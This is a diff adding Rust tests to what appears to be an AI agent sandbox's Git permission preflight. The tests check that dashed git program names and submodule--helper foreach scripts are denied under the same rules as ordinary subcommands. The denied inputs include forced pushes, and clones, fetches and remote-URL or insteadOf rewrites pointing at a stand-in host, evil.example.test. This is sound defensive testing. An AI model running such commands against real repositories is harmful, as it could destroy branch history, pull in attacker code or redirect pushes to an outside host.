@@ -3700,6 +3700,168 @@ mod tests {
         }
     }
 
+    /// WI#886: `git <verb>` and the dashed program `git-<verb>` in git's exec
+    /// path are the same command, so the dashed spelling gets the same reading
+    /// as the subcommand — for a bare name and for any path.
+    #[test]
+    fn dashed_git_programs_get_the_same_reading_as_the_subcommand() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        // Only `origin` is granted, so `upstream` is an ungranted remote.
+        let host = GitGrantConfig::from_parts(
+            "origin=file:///workspace/remotes/origin.git",
+            "origin",
+        )
+        .unwrap()
+        .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+
+        // A forced push is refused under every spelling of the program.
+        for command in [
+            "git push -f origin master",
+            "git-push -f origin master",
+            "/usr/lib/git-core/git-push -f origin master",
+            "/usr/libexec/git-core/git-push -f origin master",
+            "env git-push -f origin master",
+            "git-push origin +master",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // A read of an ungranted remote is refused under both spellings.
+        for command in [
+            "git fetch upstream",
+            "git-fetch upstream",
+            "/usr/lib/git-core/git-fetch upstream",
+            "git-fetch https://evil.example.test/repo.git",
+            "git clone https://evil.example.test/repo.git",
+            "git-clone https://evil.example.test/repo.git",
+            "git-pull upstream main",
+            "git-ls-remote upstream",
+            "git-remote add backup https://evil.example.test/repo.git",
+            "git-archive --remote=upstream HEAD",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // `git config` writes of a redirecting key are refused by path too.
+        for command in [
+            "git config remote.origin.url https://evil.example.test/repo.git",
+            "git-config remote.origin.url https://evil.example.test/repo.git",
+            "/usr/lib/git-core/git-config remote.origin.url https://evil.example.test/r.git",
+            "git-config url.https://evil.example.test/.insteadOf https://git.example.test/",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // The transport plumbing keeps its refusal under the dashed name.
+        for command in [
+            "git-send-pack /workspace/remotes/origin.git HEAD:refs/heads/x",
+            "/usr/lib/git-core/git-send-pack /workspace/remotes/origin.git HEAD:x",
+            "git-fetch-pack https://evil.example.test/repo.git",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+            assert!(
+                error
+                    .to_string()
+                    .contains("not supported by manifest Git preflight"),
+                "{command}: {error}"
+            );
+        }
+        // Ordinary commands keep passing, including the granted spellings.
+        for command in [
+            "git push origin main",
+            "git-push origin main",
+            "/usr/lib/git-core/git-push origin main",
+            "git-fetch origin",
+            "git-clone file:///workspace/remotes/origin.git",
+            "git-config --get remote.origin.url",
+            "git submodule foreach 'cargo build'",
+            "grep git README",
+            "ls /usr/lib/git-core",
+            "du -sh /usr/lib/git-core",
+            "cargo build",
+        ] {
+            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
+        }
+    }
+
+    /// WI#886: `git submodule--helper` is the program behind `git submodule`,
+    /// and its `foreach` body runs the same way. Read it with the helper's own
+    /// option rules; refuse the subcommands the preflight does not read.
+    #[test]
+    fn submodule_helper_foreach_is_read_like_submodule_foreach() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        let host = GitGrantConfig::from_parts(
+            "origin=file:///workspace/remotes/origin.git",
+            "origin",
+        )
+        .unwrap()
+        .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+
+        for command in [
+            // The measured rows, with their porcelain controls.
+            "git submodule foreach 'git push -f origin master'",
+            "git submodule--helper foreach 'git push -f origin master'",
+            "git submodule--helper foreach --rec 'git push -f origin master'",
+            "git submodule--helper foreach --quiet --recursive -- 'git push -f origin master'",
+            "/usr/lib/git-core/git-submodule foreach 'git push -f origin master'",
+            "/usr/lib/git-core/git-submodule--helper foreach 'git push -f origin master'",
+            // The helper accepts every unambiguous long-option prefix.
+            "git submodule--helper foreach --r 'git push -f origin master'",
+            "git submodule--helper foreach --recu 'git push -f origin master'",
+            "git submodule--helper foreach --q 'git push -f origin master'",
+            "git submodule--helper foreach -q --rec 'git push -f origin master'",
+            // The whole operand tail is one script, as for the porcelain.
+            "git submodule--helper foreach sh -c 'git push -f origin master'",
+            "git submodule--helper foreach git fetch upstream",
+            "git submodule--helper foreach 'git fetch upstream'",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        // Subcommands the preflight does not read are refused, not allowed to
+        // inherit the catch-all.
+        for command in [
+            "git submodule--helper status",
+            "git submodule--helper add /workspace/remotes/origin.git",
+            "git submodule--helper clone",
+        ] {
+            let error = check_granted(command, &grant).unwrap_err();
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        for command in [
+            "git submodule foreach 'cargo build'",
+            "git submodule--helper foreach 'cargo build'",
+            "git submodule--helper foreach --rec 'cargo build'",
+            "git submodule--helper foreach --quiet --recursive -- 'cargo build'",
+            "git submodule--helper foreach echo hi there",
+        ] {
+            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
+        }
+    }
+
     #[test]
     fn command_line_config_cannot_redefine_the_scanned_verb() {
         let (_temp, grant) = workspace_with_remote();
